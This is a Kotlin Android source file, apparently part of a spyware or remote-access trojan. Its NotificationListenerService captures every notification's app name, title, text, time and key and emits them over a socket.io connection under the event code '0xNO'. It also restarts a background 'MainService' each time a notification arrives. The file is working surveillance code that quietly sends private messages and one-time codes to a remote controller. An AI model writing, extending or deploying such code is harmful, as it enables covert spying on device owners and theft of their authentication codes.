package com.neaking

import android.annotation.SuppressLint
import android.app.Notification
import android.service.notification.NotificationListenerService
import android.content.Intent
import android.os.IBinder
import android.service.notification.StatusBarNotification
import android.util.Log
import android.widget.Toast
import org.json.JSONObject
import org.json.JSONException

class NotificationListener : NotificationListenerService() {
    override fun onBind(intent: Intent): IBinder? {
        return super.onBind(intent)
    }

    @SuppressLint("LongLogTag")
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
          //  Log.e("Notification received 6767", "Receiving Notifications")
            startService(Intent(this, MainService::class.java))

            val appName = sbn.packageName
            val title = sbn.notification.extras.getString(Notification.EXTRA_TITLE)
            val contentCs = sbn.notification.extras.getCharSequence(Notification.EXTRA_TEXT)
            var content = ""
            if (contentCs != null) content = contentCs.toString()
            val postTime = sbn.postTime
            val uniqueKey = sbn.key
            val data = JSONObject()
            data.put("appName", appName)
            data.put("title", title)
            data.put("content", "" + content)
            data.put("postTime", postTime)
            data.put("key", uniqueKey)

            if (ConnectionManager.mSocket == null){
               // ConnectionManager.startAsync(this)
            }else{
                 val mSocket = SocketHandler.getSocket()
            mSocket.emit( "0xNO" , data)
            }

        } catch (e: JSONException) {
            e.printStackTrace()
        }
    }
}